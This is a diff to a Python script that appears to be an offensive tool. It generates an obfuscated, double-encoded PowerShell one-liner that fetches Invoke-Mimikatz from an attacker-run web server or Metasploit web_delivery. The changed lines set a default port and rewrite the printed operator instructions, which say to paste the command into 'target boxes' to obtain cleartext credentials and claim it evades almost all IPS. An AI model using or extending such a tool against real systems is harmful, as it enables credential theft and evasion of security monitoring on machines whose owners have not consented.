@@ -139,7 +139,7 @@ def main():
     parser = argparse.ArgumentParser(usage=usage)
     parser.add_argument("-t", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
     parser.add_argument("-c", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
-    parser.add_argument("-r", action="store", dest="src_port", default=None, help="Set the port the Mimikatz server is on, defaults to port 8000")
+    parser.add_argument("-r", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
     parser.add_argument("-p", action="store", dest="payload", default=None, help="The name of the Mimikatz file")
     parser.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
     parser.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
@@ -177,7 +177,6 @@ def main():
         parser.print_help()
         sys.exit("[!] Please choose to execute either the invoker or the downloader")
 
-
     gateways = get_gateways()
     network_ifaces = get_networks(gateways)
     if src_ip == None:
@@ -187,16 +186,17 @@ def main():
             print("[!] No IP address found on interface %s") % (interface)
 
     if "invoker" in execution:
-        supplement = '''    [*] Place the PowerShell script ''' + payload + ''' in an empty directory.
-    [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
+        supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
+[*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
     elif "downloader" in execution:
-        supplement = "    [*] Start-up your Metasploit module exploit/multi/script/web_delivery."
+        supplement = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
+[*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''
 
     instructions = supplement + '''
-    [*] Then copy and paste the following command into the target boxes command shell.
-    [*] You will have cleartext credentials as long as you have correct privileges and PowerShell access.
-    [*] This double encoded script should bypass almost all forms of IPS and it drops no payloads
-    '''
+[*] Then copy and paste the following command into the target boxes command shell.
+[*] You will have cleartext credentials as long as you have correct privileges and PowerShell access.
+[*] This double encoded script should bypass almost all forms of IPS and it drops no payloads.
+'''
 
     x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution)
     print(instructions)
